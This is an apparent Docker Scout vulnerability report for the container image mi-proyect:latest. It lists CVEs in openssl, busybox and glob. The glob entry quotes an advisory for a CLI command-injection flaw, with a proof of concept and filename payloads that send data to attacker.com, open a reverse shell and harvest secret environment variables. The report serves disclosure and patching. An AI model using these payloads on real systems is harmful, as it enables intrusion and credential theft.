<h2>:mag: Vulnerabilities of <code>mi-proyect:latest</code></h2>

<details open="true"><summary>:package: Image Reference</strong> <code>mi-proyect:latest</code></summary>
<table>
<tr><td>digest</td><td><code>sha256:cef743942fa60aab21746448cdfa6d437b857c5691964215e43e2d2b3235bd47</code></td><tr><tr><td>vulnerabilities</td><td><img alt="critical: 0" src="https://img.shields.io/badge/critical-0-lightgrey"/> <img alt="high: 2" src="https://img.shields.io/badge/high-2-e25d68"/> <img alt="medium: 2" src="https://img.shields.io/badge/medium-2-fbb552"/> <img alt="low: 2" src="https://img.shields.io/badge/low-2-fce1a9"/> <!-- unspecified: 0 --></td></tr>
<tr><td>platform</td><td>linux/amd64</td></tr>
<tr><td>size</td><td>57 MB</td></tr>
<tr><td>packages</td><td>220</td></tr>
</table>
</details></table>
</details>

<table>
<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 2" src="https://img.shields.io/badge/M-2-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>openssl</strong> <code>3.5.1-r0</code> (apk)</summary>

<small><code>pkg:apk/alpine/openssl@3.5.1-r0?os_name=alpine&os_version=3.22</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-9230?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.22&vr=%3C3.5.4-r0"><img alt="high : CVE--2025--9230" src="https://img.shields.io/badge/CVE--2025--9230-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.5.4-r0</code></td></tr>
<tr><td>Fixed version</td><td><code>3.5.4-r0</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.025%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>3rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>



</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-9231?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.22&vr=%3C3.5.4-r0"><img alt="medium : CVE--2025--9231" src="https://img.shields.io/badge/CVE--2025--9231-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.5.4-r0</code></td></tr>
<tr><td>Fixed version</td><td><code>3.5.4-r0</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.055%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>13th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>



</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-9232?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.22&vr=%3C3.5.4-r0"><img alt="medium : CVE--2025--9232" src="https://img.shields.io/badge/CVE--2025--9232-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.5.4-r0</code></td></tr>
<tr><td>Fixed version</td><td><code>3.5.4-r0</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.131%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>28th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>



</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>glob</strong> <code>10.4.5</code> (npm)</summary>

<small><code>pkg:npm/glob@10.4.5</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-64756?s=github&n=glob&t=npm&vr=%3E%3D10.2.0%2C%3C10.5.0"><img alt="high 7.5: CVE--2025--64756" src="https://img.shields.io/badge/CVE--2025--64756-lightgrey?label=high%207.5&labelColor=e25d68"/></a> <i>Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')</i>

<table>
<tr><td>Affected range</td><td><code>>=10.2.0<br/><10.5.0</code></td></tr>
<tr><td>Fixed version</td><td><code>11.1.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.133%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>28th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary

The glob CLI contains a command injection vulnerability in its `-c/--cmd` option that allows arbitrary command execution when processing files with malicious names. When `glob -c <command> <patterns>` is used, matched filenames are passed to a shell with `shell: true`, enabling shell metacharacters in filenames to trigger command injection and achieve arbitrary code execution under the user or CI account privileges.

### Details

**Root Cause:**
The vulnerability exists in `src/bin.mts:277` where the CLI collects glob matches and executes the supplied command using `foregroundChild()` with `shell: true`:

```javascript
stream.on('end', () => foregroundChild(cmd, matches, { shell: true }))
```

**Technical Flow:**
1. User runs `glob -c <command> <pattern>` 
2. CLI finds files matching the pattern
3. Matched filenames are collected into an array
4. Command is executed with matched filenames as arguments using `shell: true`
5. Shell interprets metacharacters in filenames as command syntax
6. Malicious filenames execute arbitrary commands

**Affected Component:**
- **CLI Only:** The vulnerability affects only the command-line interface
- **Library Safe:** The core glob library API (`glob()`, `globSync()`, streams/iterators) is not affected
- **Shell Dependency:** Exploitation requires shell metacharacter support (primarily POSIX systems)

**Attack Surface:**
- Files with names containing shell metacharacters: `$()`, backticks, `;`, `&`, `|`, etc.
- Any directory where attackers can control filenames (PR branches, archives, user uploads)
- CI/CD pipelines using `glob -c` on untrusted content

### PoC

**Setup Malicious File:**
```bash
mkdir test_directory && cd test_directory

# Create file with command injection payload in filename
touch '$(touch injected_poc)'
```

**Trigger Vulnerability:**
```bash
# Run glob CLI with -c option
node /path/to/glob/dist/esm/bin.mjs -c echo "**/*"
```

**Result:**
- The echo command executes normally
- **Additionally:** The `$(touch injected_poc)` in the filename is evaluated by the shell
- A new file `injected_poc` is created, proving command execution
- Any command can be injected this way with full user privileges

**Advanced Payload Examples:**

**Data Exfiltration:**
```bash
# Filename: $(curl -X POST https://attacker.com/exfil -d "$(whoami):$(pwd)" > /dev/null 2>&1)
touch '$(curl -X POST https://attacker.com/exfil -d "$(whoami):$(pwd)" > /dev/null 2>&1)'
```

**Reverse Shell:**
```bash
# Filename: $(bash -i >& /dev/tcp/attacker.com/4444 0>&1)
touch '$(bash -i >& /dev/tcp/attacker.com/4444 0>&1)'
```

**Environment Variable Harvesting:**
```bash
# Filename: $(env | grep -E "(TOKEN|KEY|SECRET)" > /tmp/secrets.txt)
touch '$(env | grep -E "(TOKEN|KEY|SECRET)" > /tmp/secrets.txt)'
```

### Impact

**Arbitrary Command Execution:**
- Commands execute with full privileges of the user running glob CLI
- No privilege escalation required - runs as current user
- Access to environment variables, file system, and network

**Real-World Attack Scenarios:**

**1. CI/CD Pipeline Compromise:**
- Malicious PR adds files with crafted names to repository
- CI pipeline uses `glob -c` to process files (linting, testing, deployment)
- Commands execute in CI environment with build secrets and deployment credentials
- Potential for supply chain compromise through artifact tampering

**2. Developer Workstation Attack:**
- Developer clones repository or extracts archive containing malicious filenames
- Local build scripts use `glob -c` for file processing
- Developer machine compromise with access to SSH keys, tokens, local services

**3. Automated Processing Systems:**
- Services using glob CLI to process uploaded files or external content
- File uploads with malicious names trigger command execution
- Server-side compromise with potential for lateral movement

**4. Supply Chain Poisoning:**
- Malicious packages or themes include files with crafted names
- Build processes using glob CLI automatically process these files
- Wide distribution of compromise through package ecosystems

**Platform-Specific Risks:**
- **POSIX/Linux/macOS:** High risk due to flexible filename characters and shell parsing
- **Windows:** Lower risk due to filename restrictions, but vulnerability persists with PowerShell, Git Bash, WSL
- **Mixed Environments:** CI systems often use Linux containers regardless of developer platform

### Affected Products

- **Ecosystem:** npm
- **Package name:** glob
- **Component:** CLI only (`src/bin.mts`)
- **Affected versions:** v10.2.0 through v11.0.3 (and likely later versions until patched)
- **Introduced:** v10.2.0 (first release with CLI containing `-c/--cmd` option)
- **Patched versions:** 11.1.0and 10.5.0

**Scope Limitation:**
- **Library API Not Affected:** Core glob functions (`glob()`, `globSync()`, async iterators) are safe
- **CLI-Specific:** Only the command-line interface with `-c/--cmd` option is vulnerable

### Remediation

- Upgrade to `glob@10.5.0`, `glob@11.1.0`, or higher, as soon as possible.
- If any `glob` CLI actions fail, then convert commands containing positional arguments, to use the `--cmd-arg`/`-g` option instead.
- As a last resort, use `--shell` to maintain `shell:true` behavior until glob v12, but take care to ensure that no untrusted contents can possibly be encountered in the file path results.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 2" src="https://img.shields.io/badge/L-2-fce1a9"/> <!-- unspecified: 0 --><strong>busybox</strong> <code>1.37.0-r18</code> (apk)</summary>

<small><code>pkg:apk/alpine/busybox@1.37.0-r18?os_name=alpine&os_version=3.22</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-46394?s=alpine&n=busybox&ns=alpine&t=apk&osn=alpine&osv=3.22&vr=%3C%3D1.37.0-r19"><img alt="low : CVE--2025--46394" src="https://img.shields.io/badge/CVE--2025--46394-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=1.37.0-r19</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.031%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>5th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>



</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-58251?s=alpine&n=busybox&ns=alpine&t=apk&osn=alpine&osv=3.22&vr=%3C%3D1.37.0-r19"><img alt="low : CVE--2024--58251" src="https://img.shields.io/badge/CVE--2024--58251-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=1.37.0-r19</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.040%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>8th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>



</blockquote>
</details>
</details></td></tr>
</table>

